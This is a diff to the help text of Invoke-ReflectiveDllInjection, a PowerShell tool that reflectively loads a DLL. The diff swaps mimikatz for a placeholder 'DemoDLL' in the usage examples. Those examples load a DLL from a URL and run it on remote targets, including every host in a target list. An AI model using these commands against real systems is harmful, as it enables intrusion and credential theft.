@@ -32,20 +32,20 @@ Optional, the return type of the function being called in the DLL. Default: Void
 	
 .EXAMPLE
 
-Load mimikatz from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
+Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
 Note that the file name on the website can be any file extension.
-Invoke-ReflectiveDllInjection -DllUrl http://yoursite.com/mimikatz-en.dll -FuncReturnType WString
+Invoke-ReflectiveDllInjection -DllUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString
 
 .EXAMPLE
 
-Load mimikatz and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
-Invoke-ReflectiveDllInjection -DllPath mimikatz-en.dll -FuncReturnType WString -ComputerName Target.local
+Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
+Invoke-ReflectiveDllInjection -DllPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local
 
 .EXAMPLE
 
-Load mimikatz and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
+Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
 	the wchar_t* returned by WStringFunc() from all the computers.
-Invoke-ReflectiveDllInjection -DllPath mimikatz-en.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
+Invoke-ReflectiveDllInjection -DllPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
 
 .NOTES
 
@@ -72,6 +72,8 @@ extern "C" __declspec( dllexport ) wchar_t* WStringFunc()
 
 If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
 this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".
+
+Find a DemoDLL at: TODO link
 
 .LINK
 
